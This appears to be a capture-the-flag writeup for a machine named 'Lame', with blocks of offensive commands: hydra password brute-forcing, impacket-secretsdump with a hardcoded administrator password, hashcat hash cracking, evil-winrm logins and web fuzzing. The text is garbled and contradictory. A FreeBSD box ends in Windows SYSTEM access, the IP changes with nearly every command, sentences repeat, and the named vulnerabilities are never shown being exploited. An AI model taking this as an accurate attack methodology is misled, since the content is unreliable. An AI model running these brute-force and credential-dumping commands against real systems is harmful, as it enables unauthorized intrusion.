---
TitleSEO: "VulnHub — Lame (Insane FreeBSD) | ZureFX"
TitlePost: "VulnHub — Lame (Insane FreeBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Lame. CORS Misconfiguration and IDOR to achieve insane compromise on FreeBSD."
Keywords: "reversing, tryhackme, active directory"
URL: "https://zurefx.github.io/writeups/htb-lame-414.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-lame-414/"
Date: "2026-03-06"
Tags: "Reversing, TryHackMe, Active Directory"
Section: "writeups"
Lang: "en"
main_img: "htb-lame-414"
Permalink: "/writeups/htb-lame-414.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Lame** is rated **Insane** on VulnHub. It runs **FreeBSD** and the IP address during this analysis was `10.115.51.147`.

### Objectives

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.104.18.229 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
evil-winrm -i 10.129.185.192 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Command injection was possible through unsanitized user input in the search functionality. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. Unconstrained delegation was enabled on the compromised machine.

```bash
nmap -sCV -p139,23,23 10.62.75.2 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.123.63.207 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.53.102.249/FUZZ
```

The service was running without proper input validation, leading to injection vulnerabilities. The target system was identified as running a vulnerable version of the service.

### SMB Enumeration

The backup files contained sensitive information that should not have been accessible. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
nmap -sCV -p464,5986,993 10.115.252.110 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.78.224.249
nmap -sCV -p1433,995,110 10.113.62.81 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.38.244.142/FUZZ
```

Command injection was possible through unsanitized user input in the search functionality. The application stored sensitive credentials in an unencrypted configuration file. Privilege escalation was possible due to misconfigured sudo permissions.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target.

Key finding: **CORS Misconfiguration**.

Privilege escalation was possible due to misconfigured sudo permissions. Unconstrained delegation was enabled on the compromised machine.

### Initial Access

The target system was identified as running a vulnerable version of the service. The service account had excessive permissions assigned in Active Directory.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.49.219.64 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.39.60.228/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The service account had excessive permissions assigned in Active Directory. The application stored sensitive credentials in an unencrypted configuration file.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The service account had excessive permissions assigned in Active Directory.

```powershell
feroxbuster -h
```

### Exploitation

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.76.166.99
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.111.209 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Summary

### Tools Used

- `crackmapexec`
- `mimikatz`
- `socat`
- `nikto`
- `smbexec`

### Key Takeaways

- CORS Misconfiguration
- IDOR
- XXE
- Unconstrained Delegation
